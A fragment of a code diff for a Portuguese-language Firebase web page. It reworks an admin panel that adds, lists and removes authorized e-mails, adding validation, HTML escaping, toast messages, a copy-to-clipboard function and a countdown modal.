+  const networks = ["WiFi-5G", "Ethernet", "Cellular-4G", "VPN-Tunnel"];
+  const statuses = ["São Paulo", "Rio de Janeiro", "Minas Gerais", "Paraná"];
+  return `${networks[Math.floor(Math.random() * networks.length)]} • ${statuses[Math.floor(Math.random() * statuses.length)]}`;
+}
+
+/* ==================== ADMIN ==================== */
 function openAdmin() {
-  document.getElementById("mainPlatform").style.display = "none";
+  document.getElementById("mainPlatform").style.display = "none"; 
   document.getElementById("adminPanel").style.display = "flex";
+  document.getElementById("adminContent").style.display = "block";
   loadEmails();
 }
 
@@ -882,34 +1070,133 @@ function closeAdmin() {
   document.getElementById("mainPlatform").style.display = "block";
 }
 
-async function loadEmails() {
-  const container = document.getElementById("emailList");
-  container.innerHTML = "Carregando...";
-  const snap = await getDocs(collection(db, "emails"));
-  container.innerHTML = "";
-  snap.forEach(d => {
-    const item = document.createElement("div");
-    item.className = "email-item";
-    item.innerHTML = `<span>${d.data().email}</span><button class="remove-btn" onclick="removeEmail('${d.id}')">Remover</button>`;
-    container.appendChild(item);
-  });
-}
-
+/* ==================== EMAIL MANAGEMENT (FIREBASE) ==================== */
 async function addEmail() {
   const input = document.getElementById("newEmailInput");
   const email = input.value.trim().toLowerCase();
-  if (email) {
-    await addDoc(collection(db, "emails"), { email });
+
+  if (!email) return;
+  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+    showToast("⚠️ E-mail inválido.");
+    return;
+  }
+
+  try {
+    await addDoc(collection(db, "emails"), { email: email });
     input.value = "";
     loadEmails();
+    showToast("✅ E-mail autorizado com sucesso!");
+  } catch (e) {
+    showToast("❌ Erro ao adicionar e-mail.");
+  }
+}
+
+document.getElementById("newEmailInput").addEventListener("keydown", function(e) {
+  if (e.key === "Enter") addEmail();
+});
+
+async function loadEmails() {
+  const container = document.getElementById("emailList");
+  container.innerHTML = '<div class="no-emails">Carregando...</div>';
+
+  try {
+    const querySnapshot = await getDocs(collection(db, "emails"));
+    let html = "";
+    let count = 0;
+
+    querySnapshot.forEach(d => {
+      count++;
+      html += '<div class="email-item">' +
+        '<span>' + escapeHtml(d.data().email) + '</span>' +
+        '<button class="remove-btn" onclick="removeEmail(\'' + d.id + '\')">Remover</button>' +
+        '</div>';
+    });
+
+    if (count === 0) {
+      container.innerHTML = '<div class="no-emails">Nenhum e-mail autorizado ainda.</div>';
+    } else {
+      container.innerHTML = html;
+    }
+  } catch (e) {
+    container.innerHTML = '<div class="no-emails">Erro ao carregar lista.</div>';
   }
 }
 
 async function removeEmail(id) {
-  if (confirm("Remover acesso?")) {
-    await deleteDoc(doc(db, "emails", id));
-    loadEmails();
+  if (confirm("Deseja remover este e-mail?")) {
+    try {
+      await deleteDoc(doc(db, "emails", id));
+      loadEmails();
+      showToast("🗑️ E-mail removido.");
+    } catch (e) {
+      showToast("❌ Erro ao remover.");
+    }
   }
+}
+
+/* ==================== UTILS ==================== */
+function escapeHtml(text) {
+  const div = document.createElement("div");
+  div.textContent = text;
+  return div.innerHTML;
+}
+
+function showToast(msg) {
+  const oldToast = document.querySelector(".toast");
+  if(oldToast) oldToast.remove();
+
+  const toast = document.createElement("div");
+  toast.className = "toast";
+  toast.textContent = msg;
+  document.body.appendChild(toast);
+  setTimeout(function() {
+    if (toast.parentNode) toast.parentNode.removeChild(toast);
+  }, 2600);
+}
+
+/* ==================== SECURITY MODAL ==================== */
+let countdownInterval;
+
+function showSecurityModal() {
+  const overlay = document.getElementById("securityModalOverlay");
+  overlay.classList.add("show");
+  
+  let timeLeft = 5;
+  const countdownEl = document.getElementById("countdownTimer");
+  
+  countdownInterval = setInterval(() => {
+    timeLeft--;
+    countdownEl.innerHTML = `Fechando em <strong>${timeLeft}</strong>s`;
+    
+    if (timeLeft <= 0) {
+      clearInterval(countdownInterval);
+      closeSecurityModal();
+    }
+  }, 1000);
+}
+
+function closeSecurityModal() {
+  clearInterval(countdownInterval);
+  const overlay = document.getElementById("securityModalOverlay");
+  overlay.classList.remove("show");
+}
+
+/* ==================== COPY FUNCTION ==================== */
+function copiar(id) {
+  const texto = document.getElementById(id).innerText.trim();
+  navigator.clipboard.writeText(texto).then(function() {
+    showSecurityModal();
+    showToast("✅ Copiado para a área de transferência!");
+  }).catch(function() {
+    const ta = document.createElement("textarea");
+    ta.value = texto;
+    document.body.appendChild(ta);
+    ta.select();
+    document.execCommand("copy");
+    document.body.removeChild(ta);
+    showSecurityModal();
+    showToast("✅ Copiado para a área de transferência!");
+  });
 }
 </script>
 
